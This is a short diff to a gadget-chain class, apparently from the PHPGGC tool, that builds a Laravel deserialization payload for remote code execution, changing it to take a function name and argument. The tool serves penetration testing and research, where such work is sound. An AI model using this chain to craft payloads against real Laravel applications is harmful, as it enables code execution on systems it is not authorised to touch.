@@ -11,10 +11,11 @@ class RCE3 extends \PHPGGC\GadgetChain\RCE
 
     public function generate(array $parameters)
     {
-        $code = $parameters['code'];
+        $function = $parameters['function'];
+        $parameter = $parameters['parameter'];
 
         return new \Illuminate\Broadcasting\PendingBroadcast(
-            new \Illuminate\Notifications\ChannelManager($code) 
+            new \Illuminate\Notifications\ChannelManager($function, $parameter) 
         );
     }
 }
